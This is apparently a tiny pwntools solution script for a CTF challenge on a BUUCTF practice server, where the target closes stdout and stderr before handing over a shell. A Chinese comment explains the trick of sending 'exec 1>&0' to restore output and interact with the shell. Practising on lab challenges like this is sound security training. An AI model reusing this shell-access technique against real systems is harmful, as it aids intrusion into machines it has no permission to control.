from pwn import *

r = remote('node5.buuoj.cn', 27443)

'''
  close(1);
  close(2);
  return shell();
'''
# 程序禁止了标准输出和错误输出, 可以用 exec 1>&0 把stdout重定向到stdin就可以正常交互了
r.sendline(b'exec 1>&0')
r.interactive()
